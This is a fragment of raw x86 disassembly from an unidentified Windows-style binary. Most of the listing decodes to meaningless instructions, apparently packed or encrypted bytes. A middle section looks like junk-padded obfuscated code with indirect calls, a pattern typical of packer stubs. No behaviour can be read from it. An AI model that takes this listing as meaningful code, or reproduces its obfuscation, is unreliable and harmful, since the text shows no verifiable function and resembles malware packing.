  403349:	and    BYTE PTR [ecx+0x1dfbf756],0xd8
  403350:	add    bl,dl
  403352:	les    eax,FWORD PTR [esi+0x2c]
  403355:	push   eax
  403356:	mov    al,ds:0x7752531e
  40335b:	into   
  40335c:	ret    0xbef2
  40335f:	les    esi,FWORD PTR [ebx+ebp*4]
  403362:	lds    eax,FWORD PTR [edi+0x2c]
  403365:	add    BYTE PTR [ebx-0x161d27af],cl
  40336b:	xor    al,0xae
  40336d:	mov    BYTE PTR [ecx+0x55],ah
  403370:	xchg   DWORD PTR [eax+0x3c],esp
  403373:	sahf   
  403374:	mov    esp,0x2232daa5
  403379:	(bad)  
  40337a:	into   
  40337b:	test   al,0x8c
  40337d:	cmp    edx,DWORD PTR [eax-0x28]
  403380:	and    eax,DWORD PTR [eax+0x4ff45633]
  403386:	inc    esp
  403387:	fist   DWORD PTR [edx+0x6d]
  40338a:	out    dx,eax
  40338b:	xlat   BYTE PTR ds:[ebx]
  40338c:	cmp    dh,ch
  40338e:	(bad)  
  40338f:	dec    edx
  403390:	sub    al,0xf2
  403392:	imul   ebp,DWORD PTR [esi],0xffffff94
  403395:	sub    eax,0xd9419cc0
  40339a:	and    ebp,0x65e50dd4
  4033a0:	and    DWORD PTR [edx],eax
  4033a2:	shr    BYTE PTR [edi],cl
  4033a4:	imul   BYTE PTR [edx+0x17]
  4033a7:	fwait
  4033a8:	cmp    ebx,DWORD PTR [eax]
  4033aa:	in     eax,0xbf
  4033ac:	and    ch,BYTE PTR [ebp+0x2c65323f]
  4033b2:	xor    al,0xa4
  4033b4:	popf   
  4033b5:	je     0x40339d
  4033b7:	dec    ecx
  4033b8:	push   cs
  4033b9:	sbb    edi,ebx
  4033bb:	or     al,0x16
  4033bd:	into   
  4033be:	or     eax,0xdf8bc562
  4033c3:	fwait
  4033c4:	dec    ebx
  4033c5:	push   eax
  4033c6:	enter  0x2e88,0xc8
  4033ca:	mov    gs,WORD PTR [edi+0x71]
  4033cd:	mov    ds:0x318c5f28,eax
  4033d2:	mov    esp,0xa898226d
  4033d7:	sub    DWORD PTR [eax-0x3a],edx
  4033da:	pushf  
  4033db:	leave  
  4033dc:	les    edx,FWORD PTR [edx+0x285a3531]
  4033e2:	nop
  4033e3:	sub    BYTE PTR [eax+0x194b613b],ah
  4033e9:	pop    edx
  4033ea:	adc    ah,BYTE PTR [esi+0x1c]
  4033ed:	dec    DWORD PTR [ebp-0xe]
  4033f0:	shr    ch,0x7b
  4033f3:	in     al,dx
  4033f4:	ret    0x9dbd
  4033f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f8:	jno    0x40346a
  4033fa:	mov    ecx,cs
  4033fc:	inc    esi
  4033fd:	pusha  
  4033fe:	jbe    0x4033ea
  403400:	sub    eax,0xfe7ede66
  403405:	mov    cl,0xb3
  403407:	adc    BYTE PTR [eax+0x270917cc],cl
  40340d:	mov    eax,0x8018c76d
  403412:	add    BYTE PTR ds:0xc3787032,0xca
  403419:	mov    ch,BYTE PTR [ecx+0x6d]
  40341c:	push   ebp
  40341d:	stos   DWORD PTR es:[edi],eax
  40341e:	rcl    eax,0x6a
  403421:	inc    esi
  403422:	hlt    
  403423:	mov    WORD PTR [eax-0x1e],fs
  403426:	pop    eax
  403427:	test   al,0x5f
  403429:	out    dx,eax
  40342a:	mov    ecx,0x9416a378
  40342f:	fisub  WORD PTR ds:0x24af1462
  403435:	fidivr WORD PTR [edi+edx*1+0x1f]
  403439:	mov    ebx,0xd24217b0
  40343e:	(bad)  
  40343f:	pop    esi
  403440:	jo     0x403404
  403442:	and    eax,0xd235636d
  403447:	out    dx,eax
  403448:	jge    0x40346f
  40344a:	jp     0x40348c
  40344c:	sbb    cl,BYTE PTR [ecx-0x73]
  40344f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403450:	add    DWORD PTR [edx-0x32],esp
  403453:	pop    edi
  403454:	mov    ds:0xc8e12907,eax
  403459:	scas   al,BYTE PTR es:[edi]
  40345a:	mov    cl,0x25
  40345c:	sbb    BYTE PTR [edx],ch
  40345e:	jmp    0x637b:0xeba5d373
  403465:	xchg   edx,eax
  403466:	jnp    0x40340f
  403468:	xor    ecx,ebp
  40346a:	dec    eax
  40346b:	retf   
  40346c:	xchg   esp,eax
  40346d:	mov    DWORD PTR [ebx+0x32226db4],ebx
  403473:	dec    ebp
  403474:	imul   esp,ecx,0x70fd6e75
  40347a:	(bad)  
  40347c:	jecxz  0x4034d1
  40347e:	cmp    bh,BYTE PTR [esi-0x28a7193d]
  403484:	fcomp  DWORD PTR [edx+0x7ec172d2]
  40348a:	ficom  DWORD PTR [esi+0x25]
  40348d:	inc    esi
  40348e:	push   esi
  40348f:	cmc    
  403490:	mov    dl,0x7c
  403492:	stos   BYTE PTR es:[edi],al
  403493:	(bad)  
  403494:	pop    ebx
  403495:	push   eax
  403496:	ss fsub st,st(0)
  403499:	lahf   
  40349a:	lahf   
  40349b:	sub    BYTE PTR [eax+edx*4+0x3b],dl
  40349f:	pop    ecx
  4034a0:	outs   dx,BYTE PTR ds:[esi]
  4034a1:	push   edi
  4034a2:	sbb    ecx,esp
  4034a4:	dec    eax
  4034a5:	daa    
  4034a6:	adc    BYTE PTR ds:0xa30f8103,bh
  4034ac:	arpl   WORD PTR [edi+0x78b2a09d],bp
  4034b2:	or     DWORD PTR [ecx+0x28a17103],ecx
  4034b8:	out    dx,al
  4034b9:	sub    BYTE PTR [ebx+eiz*4-0x2c],al
  4034bd:	or     dl,BYTE PTR [eax]
  4034bf:	cwde   
  4034c0:	pop    esi
  4034c1:	(bad)  
  4034c2:	es push edi
  4034c4:	int    0x55
  4034c6:	xor    eax,0xd054899a
  4034cb:	inc    ecx
  4034cc:	pop    edx
  4034cd:	inc    ecx
  4034ce:	cld    
  4034cf:	add    bh,ch
  4034d1:	scas   eax,DWORD PTR es:[edi]
  4034d2:	scas   eax,DWORD PTR es:[edi]
  4034d3:	fs aam 0xe2
  4034d6:	popf   
  4034d7:	inc    eax
  4034d8:	aaa    
  4034d9:	out    0xee,al
  4034db:	adc    BYTE PTR [edi+ecx*2-0x6cccc293],ah
  4034e2:	aaa    
  4034e3:	sbb    BYTE PTR [eax-0x4f179d6],dh
  4034e9:	hlt    
  4034ea:	ret    
  4034eb:	(bad)  
  4034ec:	fimul  DWORD PTR [ebx+0x13bec4d]
  4034f2:	mov    DWORD PTR ds:0x4281b3,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx-0x4e],ch
  403514:	jns    0x40357f
  403516:	mov    esp,0x1818e5c3
  40351b:	sahf   
  40351c:	adc    bl,BYTE PTR [eax]
  40351e:	sbb    BYTE PTR [ecx+0x60],bl
  403521:	dec    ebx
  403522:	fbld   TBYTE PTR [esi+0x16]
  403525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403526:	outs   dx,BYTE PTR ds:[esi]
  403527:	sub    dl,BYTE PTR [edi+0x7b]
  40352a:	adc    DWORD PTR [esi+ebx*4],edi
  40352d:	fnstenv [edx-0x45461c5d]
  403533:	lods   al,BYTE PTR ds:[esi]
  403534:	dec    esi
  403535:	adc    al,0x47
  403537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403538:	mov    cs,WORD PTR [ebp+0x7b]
  40353b:	xchg   edx,eax
  40353c:	pushf  
  40353d:	in     al,0xcd
  40353f:	inc    esi
  403540:	mov    dh,0x19
  403542:	in     al,dx
  403543:	pop    es
  403544:	inc    ebx
  403545:	adc    bh,BYTE PTR [edx+ebx*4]
  403548:	clc    
  403549:	ins    BYTE PTR es:[edi],dx
  40354a:	dec    DWORD PTR [ebx-0x33]
  40354d:	addr16 cwde 
  40354f:	sub    eax,esp
  403551:	or     eax,0x37948cd4
  403556:	out    0x58,eax
  403558:	or     ah,BYTE PTR [esi]
  40355a:	xor    eax,0xf721a663
  40355f:	in     eax,0xae
  403561:	xor    ch,0xfc
  403564:	inc    ecx
  403565:	or     al,0x73
  403567:	mov    bl,0xb0
  403569:	mov    ch,0xba
  40356b:	mov    edx,0x863382bd
  403570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403571:	call   0xc5fc:0x7b1d4ad
  403578:	out    dx,eax
  403579:	add    al,0xf8
  40357b:	mov    esi,0xe800bb9d
  403580:	std    
  403581:	or     ecx,esp
  403583:	pop    ecx
  403584:	pop    edi
  403585:	inc    ecx
  403586:	icebp  
  403587:	xor    eax,0x46bbc5dc
  40358c:	pusha  
  40358d:	aam    0x2c
  40358f:	inc    edi
  403590:	inc    ecx
  403591:	push   0xda834495
  403596:	dec    edi
  403597:	or     bh,BYTE PTR [ebx-0x77da5529]
  40359d:	imul   eax,DWORD PTR [ebx],0x8f05b664
  4035a3:	inc    dl
  4035a5:	ucomiss xmm7,DWORD PTR [ecx+0xb417a73]
  4035ac:	jnp    0x4035b6
  4035ae:	imul   eax,DWORD PTR [ebx],0xeb251051
  4035b4:	sbb    esp,ebp
  4035b6:	sub    al,0xdd
  4035b8:	jmp    0xb0da:0x46229e6b
  4035bf:	aad    0xf2
  4035c1:	test   DWORD PTR [ebp-0x4f],0xcf4b4a9b
  4035c8:	outs   dx,BYTE PTR ds:[esi]
  4035c9:	jmp    0x3ae7b27
  4035ce:	sub    DWORD PTR [edi+0x1abf2103],eax
  4035d4:	sbb    ch,ah
  4035d6:	sar    BYTE PTR [esi+edx*8],1
  4035d9:	and    BYTE PTR [edi],dh
  4035db:	push   0xffffff99
  4035dd:	imul   esp,DWORD PTR [eax+0x6867377c],0xffffffd6
  4035e4:	sub    ch,cl
  4035e6:	sub    dl,bh
  4035e8:	cmp    DWORD PTR [esi],ecx
  4035ea:	lea    edx,[edi-0x519dfb38]
  4035f0:	out    0x2a,al
  4035f2:	sahf   
  4035f3:	loopne 0x4035e7
  4035f5:	add    DWORD PTR [edi+0x1d],ebp
  4035f8:	dec    ebx
  4035f9:	dec    DWORD PTR [esi]
  4035fb:	sub    dh,ch
  4035fd:	aad    0xcc
  4035ff:	shl    DWORD PTR [ebx],0x1f
  403602:	pop    ecx
  403603:	adc    DWORD PTR ds:0xfd084d4b,ebp
  403609:	mov    esi,0xfe74d582
  40360e:	mov    al,0x3b
  403610:	(bad)  
  403611:	mov    edx,0xf74f509e
  403616:	(bad)  
  403617:	pop    esp
  403618:	dec    esi
  403619:	loopne 0x4035e6
  40361b:	pop    edx
  40361c:	fsubr  QWORD PTR [eax]
  40361e:	mov    al,ds:0x25613e92
  403623:	bound  esp,QWORD PTR [esi-0x71]
  403626:	clc    
  403627:	and    DWORD PTR ds:0xdef8633,0x6572c723
  403631:	xor    edx,0x8d01dd9e
  403637:	inc    eax
  403638:	pushf  
  403639:	inc    dx
  40363b:	jo     0x4035de
  40363d:	retf   
  40363e:	arpl   dx,dx
  403640:	pop    ebp
  403641:	xor    eax,0x78d1b0c6
  403646:	ror    DWORD PTR [ebp+0x49],1
  403649:	mov    BYTE PTR [edi-0x4b7be735],cl
  40364f:	pusha  
  403650:	hlt    
  403651:	in     al,dx
  403652:	scas   al,BYTE PTR es:[edi]
  403653:	add    edi,ebp
  403655:	xor    al,0x3c
  403657:	outs   dx,DWORD PTR ds:[esi]
  403658:	push   0xffffffd9
  40365a:	shrd   DWORD PTR [edi+0x2afca820],esp,cl
  403661:	call   0xe545089
  403666:	sub    edx,DWORD PTR [esi]
  403668:	lods   al,BYTE PTR ds:[esi]
  403669:	ds daa 
  40366b:	pop    es
  40366c:	mov    ch,0x23
  40366e:	jo     0x4036bd
  403670:	lods   al,BYTE PTR ds:[esi]
  403671:	push   esi
  403672:	cmp    DWORD PTR [edx-0x10],ebx
  403675:	add    edi,DWORD PTR [edx+0x6989c57]
  40367b:	aaa    
  40367c:	pop    ebp
  40367d:	ror    DWORD PTR [ecx+0xc1aa1b0],1
  403683:	mov    ah,0x38
  403685:	aaa    
  403686:	inc    ecx
  403687:	lock ss js 0x4036db
  40368b:	out    0x4e,eax
  40368d:	in     eax,dx
  40368e:	icebp  
  40368f:	shl    ah,0x7b
  403692:	dec    ecx
  403693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403694:	int    0x22
  403696:	dec    esp
  403697:	test   al,0x47
  403699:	jbe    0x4036b0
  40369b:	dec    ebp
  40369c:	loopne 0x40368b
  40369e:	mov    esi,0xfc8b1d3f
  4036a3:	inc    esp
  4036a4:	cli    
  4036a5:	(bad)  
  4036a7:	mov    al,0x56
  4036a9:	repnz mov ah,BYTE PTR [ecx]
  4036ac:	xor    ah,BYTE PTR [ecx+0x42]
  4036af:	add    ch,BYTE PTR [esi-0x50dd07ad]
  4036b5:	fs mov ebp,0x139304f9
  4036bb:	push   ds
  4036bc:	enter  0xb27,0x6e
  4036c0:	outs   dx,DWORD PTR ds:[esi]
  4036c1:	retf   
  4036c2:	mov    dh,BYTE PTR [eax-0x16897d93]
  4036c8:	mov    bl,0xe1
  4036ca:	das    
  4036cb:	lods   eax,DWORD PTR ds:[esi]
  4036cc:	outs   dx,DWORD PTR ds:[esi]
  4036cd:	adc    esp,edi
  4036cf:	popa   
  4036d0:	or     esp,DWORD PTR [esi-0x4d2affb0]
  4036d6:	jbe    0x40372e
  4036d8:	jo     0x40374d
  4036da:	sti    
  4036db:	shl    DWORD PTR [eax+0x3d],1
  4036de:	test   dl,dl
  4036e0:	xchg   ebx,eax
  4036e1:	jl     0x403723
  4036e3:	dec    ebp
  4036e4:	sub    eax,edx
  4036e6:	ds mov dl,0x11
  4036e9:	cmp    DWORD PTR [ecx+edx*8],esp
  4036ec:	jge    0x40366f
  4036ee:	add    DWORD PTR [eax-0x2e255a5b],0xffffffb5
  4036f5:	pop    edx
  4036f6:	xchg   edx,eax
  4036f7:	xor    eax,0xae02c6e4
  4036fc:	imul   esi,DWORD PTR [eax-0x234d189],0x49
  403703:	fs fwait
  403705:	sub    al,BYTE PTR es:[edx+esi*1-0x65]
  40370a:	test   al,0xd2
  40370c:	js     0x40369b
  40370e:	mov    edx,0x447ff1b0
  403713:	jbe    0x4036dd
  403715:	pushf  
  403716:	rcr    BYTE PTR [ebx-0x19],cl
  403719:	dec    esp
  40371a:	dec    ebx
  40371b:	adc    eax,0xae0737fa
  403720:	cmc    
  403721:	push   cs
  403722:	mov    dl,0xd2
  403724:	retf   
  403725:	mov    cs:0x48d8e48c,eax
  40372b:	xchg   edi,eax
  40372c:	sbb    ecx,ebp
  40372e:	rcr    BYTE PTR [ecx-0x696326d3],cl
  403734:	les    ebp,FWORD PTR [edx-0x13]
  403737:	inc    ebx
  403738:	aas    
  403739:	push   ecx
  40373a:	mov    ch,BYTE PTR [ebp-0x678d5706]
  403740:	fst    DWORD PTR [esi]
  403742:	(bad)  
  403743:	jo     0x4037c3
  403745:	push   edx
  403746:	sub    eax,0x997bd36a
  40374b:	pop    esp
  40374c:	jmp    0x4037a1
  40374e:	jp     0x4036e3
  403750:	push   ss
  403751:	and    BYTE PTR [ebx+0x59],cl
  403754:	(bad)  
  403755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403756:	inc    eax
  403757:	inc    edi
  403758:	ds inc eax
  40375a:	mov    ebp,0x6fe2bd64
  40375f:	add    eax,0xcdae07b3
  403764:	push   ecx
  403765:	mov    al,ds:0x36c9a635
  40376a:	cmp    BYTE PTR [ecx-0x44a7075d],al
  403770:	add    al,0xd4
  403772:	cwde   
  403773:	sahf   
  403774:	jb     0x403705
  403776:	sub    ah,BYTE PTR [ecx+0x8]
  403779:	nop
  40377a:	mov    ch,0xbe
  40377c:	cmp    eax,0x4dd3ec83
  403781:	jmp    0x403746
  403783:	ds ret 
  403785:	imul   ebx,DWORD PTR [ecx+0x29],0x29f857e4
  40378c:	inc    ecx
  40378d:	mov    ah,0x65
  40378f:	jno    0x403764
  403791:	in     eax,dx
  403792:	mov    dl,bh
  403794:	lods   al,BYTE PTR ds:[esi]
  403795:	dec    ebx
  403796:	ins    DWORD PTR es:[edi],dx
  403797:	or     DWORD PTR [ecx],esi
  403799:	outs   dx,DWORD PTR ds:[esi]
  40379a:	dec    eax
  40379c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379d:	or     al,0xe6
  40379f:	sti    
  4037a0:	mul    bh
  4037a2:	sub    al,0x47
  4037a4:	int    0xa0
  4037a6:	aas    
  4037a7:	inc    edx
  4037a8:	jo     0x40377d
  4037aa:	dec    ebp
  4037ab:	stos   DWORD PTR es:[edi],eax
  4037ac:	xor    BYTE PTR [edx+0x7a],dl
  4037af:	jmp    0x67bd6101
  4037b4:	cs sti 
  4037b6:	mov    ebp,fs
  4037b8:	xor    BYTE PTR [ebp+0x41],ah
  4037bb:	cmp    al,0xcc
  4037bd:	cmp    ebx,DWORD PTR [eax-0xd8fe62a]
  4037c3:	pop    edx
  4037c4:	je     0x403749
  4037c6:	in     eax,0xa7
  4037c8:	cmp    al,0xcb
  4037ca:	scas   al,BYTE PTR es:[edi]
  4037cb:	push   0x1d
  4037cd:	sbb    edi,DWORD PTR [ecx-0x54aff25]
  4037d3:	push   esi
  4037d4:	xchg   esi,eax
  4037d5:	loop   0x403765
  4037d7:	jg     0x403786
  4037d9:	or     eax,0x5c847476
  4037de:	pushf  
  4037df:	popf   
  4037e0:	into   
  4037e1:	jmp    0x403839
  4037e3:	jle    0x403794
  4037e5:	xor    eax,0x137fb1b0
  4037ea:	std    
  4037eb:	push   0xe4ab8827
  4037f0:	loopne 0x403803
  4037f2:	pop    esi
  4037f3:	leave  
  4037f4:	gs and eax,0x9d1ec59c
  4037fa:	sub    BYTE PTR [edx+0x47],0x80
  4037fe:	test   DWORD PTR [ebp+0x3d8225ff],0xf8a99bed
  403808:	xchg   esi,eax
  403809:	or     ch,BYTE PTR [ebx-0x2bf6898a]
  40380f:	mov    dl,0x2a
  403811:	jle    0x403806
  403813:	daa    
  403814:	mov    dh,0x66
  403816:	jbe    0x4037b2
  403818:	xchg   ebx,eax
  403819:	inc    ebx
  40381a:	shl    DWORD PTR [edx+0x26],0xa0
  40381e:	addr16 aad 0x2e
  403821:	push   eax
  403822:	adc    DWORD PTR [ebp+0x1a09a9dc],edx
  403828:	aaa    
  403829:	pop    edx
  40382a:	sbb    bh,BYTE PTR [eax+0x31ddfc31]
  403830:	pop    ebx
  403831:	jo     0x403876
  403833:	test   DWORD PTR [edi+0x21],ecx
  403836:	dec    ebx
  403838:	loop   0x403881
  40383a:	(bad)  
  40383b:	adc    dh,BYTE PTR ds:0xf678e7ad
  403841:	(bad)  
  403842:	ror    BYTE PTR [esi],1
  403844:	adc    DWORD PTR [edi+0x71],eax
  403847:	sbb    eax,0xcc7c0f12
  40384c:	imul   edx,DWORD PTR [eax+0x20],0xaba707cd
  403853:	and    BYTE PTR [edi+0x1d],0x3a
  403857:	cmp    al,0x52
  403859:	(bad)  
  40385a:	mov    ds:0x3adadb31,al
  40385f:	fcomp  DWORD PTR [ecx+0x586fe517]
  403865:	xchg   ebp,eax
  403866:	push   cs
  403867:	sub    DWORD PTR [ebx],ecx
  403869:	ins    BYTE PTR es:[edi],dx
  40386a:	adc    eax,DWORD PTR [esi-0x22d6026]
  403870:	dec    DWORD PTR [esi+0x25365d40]
  403876:	and    edx,DWORD PTR [eax-0x59e98198]
  40387c:	push   esi
  40387d:	adc    al,0xba
  40387f:	sahf   
  403880:	leave  
  403881:	loop   0x4038a8
  403883:	loopne 0x403885
  403885:	xor    DWORD PTR [eax+0x5b5209a5],0x3
  40388c:	loope  0x4038d4
  40388e:	xor    ebp,DWORD PTR [edi]
  403890:	add    dh,BYTE PTR [ebp-0x4e]
  403893:	(bad)  
  403894:	scas   eax,DWORD PTR es:[edi]
  403895:	jno    0x4038cf
  403897:	mov    eax,0x788e2059
  40389c:	jmp    0xfe9d8e20
  4038a1:	shr    BYTE PTR [eax+0x275fa614],cl
  4038a7:	mov    ds:0x8b5f2f6d,al
  4038ac:	icebp  
  4038ad:	fnsave [eax-0x1b]
  4038b0:	fild   WORD PTR [ebp+0x61]
  4038b3:	neg    BYTE PTR [esi+0x45]
  4038b6:	push   ds
  4038b7:	imul   ebx,DWORD PTR [edx-0x7bd4f1e6],0x20c55e4f
  4038c1:	jns    0x403883
  4038c3:	xchg   ebp,eax
  4038c4:	mov    eax,0xf55389c8
  4038c9:	jbe    0x4038c4
  4038cb:	mov    esi,0x11ff1775
  4038d0:	jl     0x403943
  4038d2:	call   0x653f:0x6cdd656
  4038d9:	jle    0x4038ca
  4038db:	or     al,0x23
  4038dd:	adc    eax,0x458b1734
  4038e2:	hlt    
  4038e3:	cmp    DWORD PTR ds:0x4282b3,0x0
  4038ea:	not    DWORD PTR ds:0x4281ab
  4038f0:	mov    ecx,DWORD PTR ds:0x4282d7
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x4282b3,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428f28
  403913:	xor    edx,DWORD PTR ds:0x42829f
  403919:	neg    DWORD PTR ds:0x4282b3
  40391f:	xor    DWORD PTR ds:0x4281a7,0x12a5
  403929:	and    DWORD PTR ds:0x4283f7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x4282db
  403939:	or     ecx,DWORD PTR ds:0x42828f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x4281b3,0x0
  403949:	mov    DWORD PTR ds:0x4283f7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x4281b3,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dfc
  40397f:	adc    DWORD PTR ds:0x4282e7,0x4281cf
  403989:	sbb    DWORD PTR ds:0x4282d3,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x4283d3
  403999:	or     DWORD PTR ds:0x4282af,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x4282d7
  4039a7:	adc    edx,DWORD PTR ds:0x4282bb
  4039ad:	mov    DWORD PTR ds:0x4282d7,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42828f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282f7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282eb,0x4283f7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x4281cb
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x4281a7,0x42836f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x4281b3,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x4281ab,0x428343
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x4282bf,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x4282d7,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x4281a7,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x4282d3,0x0
  403a3e:	mov    DWORD PTR ds:0x42835f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283f7
  403a57:	cmp    DWORD PTR ds:0x4282d3,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428dd8
  403a6f:	mov    edx,DWORD PTR ds:0x42838f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428423
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x4281d3,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x4281c7,0x2089
  403aa2:	or     DWORD PTR ds:0x4281ab,0x113b
  403aac:	mov    eax,ds:0x422420
  403ab1:	cmp    DWORD PTR ds:0x4281d3,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42829f
  403ac3:	mov    DWORD PTR ds:0x428283,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428373,0x6b1a
  403adc:	mov    DWORD PTR ds:0x4281d3,0x1226
  403ae6:	cmp    DWORD PTR ds:0x4281d3,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428173
  403af8:	call   DWORD PTR ds:0x428e00
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42829b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x4282df,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x4283cb,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x4281bb,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x705b3959
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x40e7e7ee],bl
  403b4b:	pop    ebx
  403b4c:	and    ebp,DWORD PTR [esi]
  403b4e:	mov    cl,0x70
  403b50:	jnp    0x403ba0
  403b52:	cmp    al,0x66
  403b54:	loop   0x403afb
  403b56:	stc    
  403b57:	mov    cl,0x57
  403b59:	mov    al,cs:0x7671e8de
  403b5f:	mov    esp,0x46c349ef
  403b64:	test   DWORD PTR [eax],ecx
  403b66:	je     0x403bc3
  403b68:	mov    ds:0x2a443ea7,eax
  403b6d:	xchg   ebp,eax
  403b6e:	scas   eax,DWORD PTR es:[edi]
  403b6f:	jle    0x403bc6
  403b71:	data16 jae 0x403b34
  403b74:	cmp    al,0x1c
  403b76:	xor    DWORD PTR [eax+eax*1+0x145c1030],0xffffffa5
  403b7e:	sbb    esi,DWORD PTR [ebx-0x15]
  403b81:	inc    edi
  403b82:	xchg   cl,dl
  403b84:	mov    ecx,0xd9008e9c
  403b89:	shl    DWORD PTR [esi-0x3a],1
  403b8c:	mov    ch,0xd7
  403b8e:	data16 mov dh,0xf2
  403b91:	mov    ch,0x30
  403b93:	jmp    0x72572895
  403b98:	test   al,0x37
  403b9a:	in     eax,0x79
  403b9c:	sub    BYTE PTR [edi-0x58],al
  403b9f:	ins    DWORD PTR es:[edi],dx
  403ba0:	sbb    ch,bh
  403ba2:	and    DWORD PTR ds:[ebp+0x7e91c3ac],edi
  403ba9:	dec    esp
  403baa:	push   edx
  403bab:	retf   0x7ef8
  403bae:	ins    BYTE PTR es:[edi],dx
  403baf:	arpl   WORD PTR [esi+0xf4294bc],cx
  403bb5:	clc    
  403bb6:	xor    BYTE PTR es:[eax],dl
  403bb9:	or     al,0x76
  403bbb:	mov    ds:0x982d4d6b,al
  403bc0:	mov    ecx,0xb66635cd
  403bc5:	xchg   esp,eax
  403bc6:	popa   
  403bc7:	pop    ds
  403bc8:	mov    edi,0x749b81fd
  403bcd:	inc    edi
  403bce:	icebp  
  403bcf:	repnz gs stos DWORD PTR es:[edi],eax
  403bd2:	stos   BYTE PTR es:[edi],al
  403bd3:	bound  edi,QWORD PTR [eax+eiz*4+0x75]
  403bd7:	retf   
  403bd8:	xchg   BYTE PTR [eax],bl
  403bda:	sub    eax,0xf7f01eee
  403bdf:	sahf   
  403be0:	mov    al,ds:0x61be55a3
  403be5:	xchg   ecx,eax
  403be6:	sub    BYTE PTR [eax+0x54fd69b6],bl
  403bec:	popa   
  403bed:	and    DWORD PTR [edi+0x1c198658],esp
  403bf3:	push   esp
  403bf4:	ss and al,0x6b
  403bf7:	jl     0x403b8e
  403bf9:	out    dx,al
  403bfa:	push   ebx
  403bfb:	mov    dl,0xe8
  403bfd:	adc    eax,DWORD PTR [bp-0x42]
  403c01:	mov    BYTE PTR [edi-0x119ed056],bh
  403c07:	jl     0x403ba2
  403c09:	int    0xa
  403c0b:	sahf   
  403c0c:	jl     0x403c40
  403c0e:	call   DWORD PTR [eax-0x3bbb7470]
  403c14:	jmp    0xef3287b9
  403c19:	je     0x403c60
  403c1b:	xchg   BYTE PTR [ebx-0x1633fe42],bh
  403c21:	pop    edi
  403c22:	sub    esp,ebx
  403c24:	pop    edx
  403c25:	sahf   
  403c26:	sbb    BYTE PTR [eax+0x9f2ded6],ch
  403c2c:	push   ds
  403c2d:	sub    BYTE PTR [ecx-0x23ea61f0],dl
  403c33:	(bad)  
  403c35:	sbb    al,0x6a
  403c37:	rdtsc  
  403c39:	mov    ebx,0x64da1870
  403c3e:	mov    al,ds:0x14e96267
  403c43:	ja     0x403be6
  403c45:	stos   BYTE PTR es:[edi],al
  403c46:	sbb    dh,bh
  403c48:	ret    
  403c49:	stos   DWORD PTR es:[edi],eax
  403c4a:	enter  0x11bf,0xca
